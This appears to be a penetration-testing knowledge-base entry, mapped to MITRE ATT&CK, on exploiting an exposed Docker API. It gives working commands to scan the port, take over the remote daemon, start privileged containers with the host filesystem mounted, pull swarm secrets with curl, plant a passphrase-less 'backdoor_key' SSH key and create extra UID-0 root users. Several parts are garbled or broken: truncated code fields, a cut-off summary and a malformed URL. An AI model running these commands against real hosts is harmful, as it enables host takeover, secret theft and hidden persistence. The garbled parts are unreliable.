---
id: 25dbc25b-a096-400d-8cbb-3dcdf6e754a0
name: Docker API Port Scanning and Container Management
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:16.983648+00:00'
updated_at: '2023-04-10T20:33:46.874738+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Discovery|TA0007 - Discovery]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Access Token Manipulation|T1134 - Access Token Manipulation]]'
- '[[Network Service Scanning|T1046 - Network Service Scanning]]'
- '[[SSH Hijacking|T1184 - SSH Hijacking]]'
- '[[Use Alternate Authentication Material|T1550 - Use Alternate Authentication Material]]'
tags:
- '[[Container - Docker Pentest]]'
- '[[Open Docker API Port]]'
commands:
- '[[Create and Run Docker Container]]'
- '[[Create Docker Container with POST Request]]'
- '[[Execute Command in Docker Container]]'
- '[[List Docker Containers]]'
- '[[Retrieve Docker Secrets with jq]]'
- '[[Scan for open ports using nmap]]'
- '[[Set Docker Host]]'
---

# Docker API Port Scanning and Container Management

## Summary

This procedure involves scanning for open Docker API ports and exploiting them to gain access to the Docker host and its containers. The attacker can then create, run, and manage containers on the host, potentially gaining access to sensitive data or systems. The technical process involves scanning

## Description

# Description

This procedure involves scanning for open Docker API ports and exploiting them to gain access to the Docker host and its containers. The attacker can then create, run, and manage containers on the host, potentially gaining access to sensitive data or systems. The technical process involves scanning for open ports, mounting a temporary Ubuntu container, connecting to the Docker host, and running containers. The business value of this procedure is that it allows attackers to gain access to sensitive data and systems that are stored in Docker containers.

## Requirements

1. Access to the target network

1. Authentication credentials for the Docker API

1. Tools such as nmap, Docker, and SSH

## Defense

1. Ensure that the Docker API is not exposed to the internet

1. Use strong authentication mechanisms for the Docker API

1. Monitor Docker logs for suspicious activity

## Objectives

1. Gain access to the Docker host and its containers

1. Create, run, and manage containers on the host

1. Access sensitive data or systems stored in Docker containers

# Instructions

1. Use the nmap command with the -sCV flags to scan the target IP address and port 2376. This will provide information about the Docker version running on the target.

**Code**: [[$ nmap -sCV 10.10.10.10 -p 2376
2376/tcp open  doc]]

> -sCV: This flag tells nmap to perform a version scan and use default scripts to probe open ports.
10.10.10.10: This is the IP address of the target machine.
-p 2376: This flag tells nmap to scan only port 2376.
2376/tcp open docker: This output shows that port 2376 is open and Docker is running on it.
Docker 19.03.5: This is the version of Docker running on the target machine.
| docker-version: This output shows that the script used to probe Docker version was docker-version.
| Version: 19.03.5: This is the version of Docker running on the target machine.
| MinAPIVersion: 1.12: This is the minimum API version supported by the Docker daemon.

**Command** ([[Scan for open ports using nmap]]):

```bash
$ nmap -sCV 10.10.10.10 -p 2376
2376/tcp open  docker  Docker 19.03.5
| docker-version:
|   Version: 19.03.5
|   MinAPIVersion: 1.12
```

2. To mount the current system inside a new "temporary" Ubuntu container, use the following command:

**Code**: [[/mnt]]

> The above command will create a new Ubuntu container and mount the current system's filesystem inside it. This will allow you to access and modify the files in the system as if you were running Ubuntu directly on the machine. The root access gained inside the container allows you to perform any necessary administrative tasks. The mounted filesystem will be located at /mnt inside the container.

3. To connect to a Docker host and run containers, follow these steps:
1. Set the DOCKER_HOST environment variable to the Docker host's IP address and port number using the following command: 

$ export DOCKER_HOST=tcp://10.10.10.10:2376

2. To run a container, use the following command:

$ docker run --name [container_name] --rm -i -v /:/mnt -u 0 -t [image_name] bash

Replace [container_name] with the desired name for the container, [image_name] with the name of the Docker image to run, and the other options as needed.

3. To run a container on a remote Docker host, use the -H option followed by the IP address and port number of the remote host, followed by the Docker command. For example:

$ docker -H open.docker.socket:2375 ps

4. To connect to a running container on a remote Docker host, use the exec command followed by the container name and the desired command. For example:

$ docker -H open.docker.socket:2375 exec -it [container_name] /bin/bash

5. To retrieve secrets from a Docker swarm, use the following command:

$ curl -s –insecure https://tls-opendocker.socket:2376/secrets | jq

6. To create a container on a remote Docker host, use the following command:

$ curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=[container_name] -d '{"Image":"[image_name]", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'

Replace [container_name] with the desired name for the container, [image_name] with the name of the Docker image to run, and the other options as needed.

**Code**: [[$ export DOCKER_HOST=tcp://10.10.10.10:2376
$ dock]]

> This command provides instructions for connecting to a Docker host and running containers. It includes examples for running containers locally and on remote hosts, as well as retrieving secrets and creating containers on remote hosts. The command also explains the various options that can be used with the Docker run command, such as specifying a container name, mounting a host directory, and running the container in privileged mode. Finally, the command explains how to use the Docker exec command to connect to a running container and run commands inside it.

**Command** ([[Set Docker Host]]):

```bash
$ export DOCKER_HOST=tcp://10.10.10.10:2376
```

**Command** ([[Create and Run Docker Container]]):

```bash
$ docker run --name ubuntu_bash --rm -i -v /:/mnt -u 0  -t ubuntu bash
```

**Command** ([[List Docker Containers]]):

```bash
$ docker -H  open.docker.socket:2375 ps
```

**Command** ([[Execute Command in Docker Container]]):

```bash
$ docker -H  open.docker.socket:2375 exec -it mysql /bin/bash
```

**Command** ([[Retrieve Docker Secrets with jq]]):

```bash
$ curl -s –insecure https://tls-opendocker.socket:2376/secrets | jq
```

**Command** ([[Create Docker Container with POST Request]]):

```bash
$ curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
```

4. To add an SSH key to the filesystem, use the following command:
ssh-keygen -t rsa -f /root/.ssh/backdoor_key -q -N ""
This will generate a new RSA key pair without a passphrase and save it to /root/.ssh/backdoor_key.

**Code**: [[/root/.ssh]]

> This command generates a new RSA key pair and saves it to the specified location. The -t option specifies the type of key to generate (in this case, RSA), the -f option specifies the filename to save the key to, and the -q option suppresses all output. The -N option specifies a passphrase for the key, which is left blank in this case to allow for easier access. Once the key is generated, it can be used to gain remote access to the system by adding it to the authorized_keys file on a remote system.

5. This command is used to manage root users on a system. It can be used to add, remove, or modify existing root users. To add a new root user, use the 'useradd' command followed by the '-ou 0' option to set the user ID to 0 (root). For example, 'useradd -ou 0 newrootuser'. To remove an existing root user, use the 'userdel' command followed by the '-r' option to remove the user's home directory as well. For example, 'userdel -r oldrootuser'. To modify an existing root user, use the 'usermod' command followed by the '-ou 0' option to change the user ID to 0 (root). For example, 'usermod -ou 0 existingrootuser'.

**Code**: [[/etc/passwd]]

> The 'useradd' command is used to create a new user account. The '-ou' option is used to set the user ID (UID) of the new user. The '0' value sets the UID to 0, which is the UID of the root user. The 'userdel' command is used to delete an existing user account. The '-r' option is used to remove the user's home directory as well. The 'usermod' command is used to modify an existing user account. The '-ou' option is used to change the UID of the user to 0, which makes the user a root user.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Discovery|TA0007 - Discovery]]
- [[Lateral Movement|TA0008 - Lateral Movement]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Access Token Manipulation|T1134 - Access Token Manipulation]]
- [[Network Service Scanning|T1046 - Network Service Scanning]]
- [[SSH Hijacking|T1184 - SSH Hijacking]]
- [[Use Alternate Authentication Material|T1550 - Use Alternate Authentication Material]]

## Commands Used

- [[Create and Run Docker Container]]
- [[Create Docker Container with POST Request]]
- [[Execute Command in Docker Container]]
- [[List Docker Containers]]
- [[Retrieve Docker Secrets with jq]]
- [[Scan for open ports using nmap]]
- [[Set Docker Host]]

## Tags

- [[Container - Docker Pentest]]
- [[Open Docker API Port]]
